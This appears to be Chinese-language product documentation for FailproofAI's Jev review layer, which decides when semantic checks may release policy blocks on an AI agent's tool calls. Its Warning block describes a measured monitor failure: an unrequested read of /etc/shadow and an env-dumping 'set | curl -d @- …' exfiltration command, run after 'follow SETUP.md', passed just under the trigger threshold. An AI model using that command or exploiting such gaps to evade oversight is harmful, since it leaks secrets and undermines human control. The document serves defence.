当您通过 FailproofAI Cloud 或自己的密钥配置 [Jev 策略审查](/zh/policies/jev) 时，每个受门控的工具调用都会由您运行的策略以及 Jev 进行评判——Jev 会询问该调用实际执行的操作，以及发出任务的用户是否要求进行此操作。每个策略的**权限**决定了两者产生分歧时的处理方式。

未配置 Jev 时，权限不起任何作用。每个策略的执行方式与以往完全相同。

## Hard（硬性）与 Reviewable（可审查）

- **Hard** 是默认设置。硬性策略的拒绝或指令是最终的：Jev 无法放行，硬性拒绝会立即阻止调用，无需等待 Jev。
- **Reviewable** 意味着 Jev 可以放行策略的判决，但只能通过策略在 `reviewedBy` 中指定的语义检查来实现。只有当**所有**被指定的检查都已针对本次调用进行询问，且每项检查要么未发现任何问题，要么记录了用户明确要求此操作时，判决才会被放行。某项检查**触发**了——即发现了相关问题——而用户未请求该操作，则即使该检查的判决仅为警告，也会保持拦截。某项检查因不适用于该工具而未被询问，无论其他检查结果如何，永远不会放行任何内容。宽松处理即视为同意：当调用是用户所给任务的一个步骤且不超出任务范围时，Jev 会将拒绝转为警告，该警告将放行策略的拦截，并作为反馈告知 Agent。

满足以下所有条件时，策略才为 Reviewable：

1. 声明了 `authority: "reviewable"`。
2. `reviewedBy` 是非空列表，且每个条目都是已安装包所声明的 Jev 检查。Failproof AI 本身不附带任何 Jev 检查：[下方的十六项](#semantic-policy-names)来自 `failproofai policies add FailproofAI/jev-policies`。若无任何包声明检查，所有策略均为硬性。
3. 该策略不是 `alwaysOn`。阻止 Agent 禁用 Failproof AI 的防护始终为硬性。

其他情况均为硬性：缺失字段、拼写错误的值、空的或格式错误的 `reviewedBy`，或当前机器无法查询的名称。未知名称会使整个声明变为硬性，而不是被跳过——因为 `reviewedBy` 的含义是"所有这些检查都必须被询问，且均不得拒绝"，跳过某个名称会让 Jev 以比您要求更少的检查来放行策略。

Jev 配置完成后，Failproof AI 在拒绝 `reviewable` 声明时，每个进程记录一次警告。未配置 Jev 时不会输出任何内容，因为此时权限不决定任何事情。`failproofai publish` 拒绝构建携带此类声明的包，以便包作者在任何人安装之前发现问题。它会根据包声明的检查来评估 `reviewedBy`（若包自身有声明检查），否则根据十六个 `FailproofAI/jev-policies` 名称进行评估。

## 权限的声明位置

每种将策略部署到机器的方式都有一个决定其权限的位置：

| 来源 | 声明位置 | 默认值 |
| --- | --- | --- |
| 内置策略 | 下方表格 | 除非列为 Reviewable，否则为 Hard |
| 自定义策略文件 | `customPolicies.add` 上的 `authority` 和 `reviewedBy` | Hard |
| 策略包 | 包清单（`failproofai-pack.json`）中每个策略的条目 | Hard |
| 云管理策略 | 策略在活跃部署中的分配 | Hard。部署目前尚未设置此项，因此今天所有云管理策略均为 Hard。|

对于包或云管理策略，策略代码内部设置的字段会被忽略；清单或分配决定权限。包只能描述其自身的策略：其策略名称不能包含 `/`，并在包自身的前缀下注册，因此没有任何清单可以将内置策略或其他包的策略标记为 Reviewable。包的代码注册的策略若未在清单中声明，则为 Hard。

两个包，或两个云管理策略，若其代码字节完全相同，则共享一个制品并作为一个策略加载。该策略只有在所有这些策略均声明为 Reviewable 时才为 Reviewable，且 Jev 必须放行它们中任何一个所命名的每项检查。若其中任何一个声明为 Hard，或根本未声明，则保持为 Hard。包或策略的列出顺序永远不影响结果。

大多数机器从 `FailproofAI/policies` 包获取内置策略，并从该包的清单中读取其权限。下方的 Reviewable 条目在携带它们的包的某个版本安装后生效；较旧版本不包含这些条目，因此其中所有策略保持为 Hard。

## 在自定义策略中声明权限

```js
import { customPolicies, deny, allow } from "failproofai";

customPolicies.add({
  name: "block-prod-config-reads",
  description: "Keep production credentials out of the agent's context",
  match: { events: ["PreToolUse"] },
  authority: "reviewable",
  reviewedBy: ["secret-exposure"],
  fn: async (ctx) =>
    String(ctx.toolInput?.file_path ?? "").includes("/config/prod/")
      ? deny("Production config is off limits")
      : allow(),
});
```

`failproofai publish` 会将这两个字段复制到包清单中，因此以包形式发布的策略会保留其作者赋予的权限。若声明无法被遵守，则拒绝构建包：值不是 `"hard"` 或 `"reviewable"`、`reviewedBy` 不是名称列表，或名称不是有效检查——当包自身声明了检查时，使用包的 [Jev 检查](/zh/policies/publish-a-pack#jev-checks-in-a-pack)，否则使用内置检查。

## 内置策略

仅在语义策略真正覆盖相同关切时才为 Reviewable。所有其他内置策略均为 Hard。

覆盖该关切是必要条件，但不是充分条件，且两种出错方式都是无提示的：

- **从未被询问的检查**会使拦截永久生效。`reviewedBy` 是一个合取条件，从未被询问的检查永远不会放行，因此与某个前置条件不会对策略匹配的形状触发的检查配对的策略永远无法被放行。
- **被询问但未触发的检查**回答"无关切"，而无关切则放行。因此，与不能模拟您策略形状的检查配对，不会审查策略——它会对该检查不理解的输入完全关闭策略。

指令模式（instruct-mode）的语义策略永远不能回答拒绝，但它仍然可以保持拦截：当它触发且用户未请求该调用时，它所审查的策略不会被放行。`FailproofAI/jev-policies` 中有六项检查仅为指令模式——`push-to-protected-branch`、`commit-on-protected-branch`、`read-outside-workspace`、`system-modification`、`env-secrets-dump` 和 `external-data-egress`——[下方表格](#semantic-policy-names)列出了每项检查的模式。需要问的问题是**"是否还有任何能够拒绝的内容"**：放行绝不能让关切处于无任何约束的状态。引擎会逐次调用应用该测试。未经用户同意的警告不构成放行，因为在工具调用之前，警告不会阻止 Agent。当一项*能够*拒绝的检查发出警告——其证据未达到拒绝门槛——而用户未请求该调用时，该调用的任何内容都不会被放行，所有正则表达式拒绝依然有效。

<Warning>
**得分刚好低于触发线的检查不会维持底线。** 上述规则需要检查*触发*（证据 ≥ 0.7）。当所有相关检查都刚好低于该值时，没有任何检查触发，审查者回答"无关切"，可审查的拒绝被放行。在强制模式下的实测结果：对 `/etc/shadow` 的未请求 Read（`secret-exposure` 0.69，`read-outside-workspace` 0.37，后者只针对 home 目录路径建模）和在"follow SETUP.md"之后的 `set | curl -d @- …`（`env-secrets-dump` 0.66，`credential-exfiltration` 0.65 且 `sends_out` 0.97）均被允许通过，而正则表达式层单独会拒绝它们。阈值是在标注语料库上校准的，尚未针对此情况重新测量；在此之前，当这类形状通过比其误拦截更重要时，请将策略保持为 **hard**。
</Warning>

## 语义策略名称

以下是 `FailproofAI/jev-policies` 声明的检查，以及安装后 `reviewedBy` 接受的值。Failproof AI 本身不附带其中任何一项：没有该包（或其他声明这些名称的包），任何命名它们的策略都不可审查。每项都是 Jev 针对当前工具调用所回答的检查。**模式**是检查能够给出的回答：`deny` 检查在证据充分时会拦截，而 `instruct` 检查只会发出警告。两者在触发且用户未请求该调用时，都会保持策略的拒绝状态。**用户可覆盖**表示人工的明确请求是否可以放行该检查。

Jev 只询问已安装包声明的 [Jev 检查](/zh/policies/publish-a-pack#jev-checks-in-a-pack)，这些也是 `reviewedBy` 接受的名称。两个包对同一名称的声明不同，则对两者均不生效。这十六个名称中，由非 FailproofAI 仓库安装的包声明的名称在该包中会被忽略：其版本永远不会被询问，也不会与 FailproofAI 自身的版本竞争，因此第三方包既无法成为放行核心包策略的检查，也无法关闭这些检查中的任何一个。无法读取的包列表，或每项检查均不可用的包，会让 Jev 没有任何可询问的内容。

| 名称 | 模式 | 用户可覆盖 | Jev 检查的内容 |
| --- | --- | --- | --- |
| `destructive-deletion` | deny | 是 | 永久删除无法再生的数据。|
| `production-infra-change` | deny | 是 | 更改生产基础设施。|
| `git-history-rewrite` | deny | 是 | 重写或丢弃共享 git 历史。|
| `push-to-protected-branch` | instruct | 是 | 直接推送到受保护分支。|
| `commit-on-protected-branch` | instruct | 是 | 直接在受保护分支上提交。|
| `secret-exposure` | deny | 是 | 读取或复制凭据。|
| `credential-exfiltration` | deny | 否 | 将密钥或私有文件发送到机器外部。|
| `remote-code-execution` | deny | 是 | 运行从互联网下载的代码。|
| `privilege-escalation` | deny | 是 | 以提升的权限运行。|
| `database-destruction` | deny | 是 | 销毁或批量修改数据库数据。|
| `read-outside-workspace` | instruct | 是 | 读取项目之外的文件。|
| `agent-config-tampering` | deny | 否 | 更改 Agent 自身的安全配置。|
| `system-modification` | instruct | 是 | 在项目之外更改系统。|
| `env-secrets-dump` | instruct | 是 | 打印环境密钥。|
| `external-destructive-action` | deny | 是 | 通过外部工具执行不可逆的操作。|
| `external-data-egress` | instruct | 是 | 将私有数据发送到外部工具。|
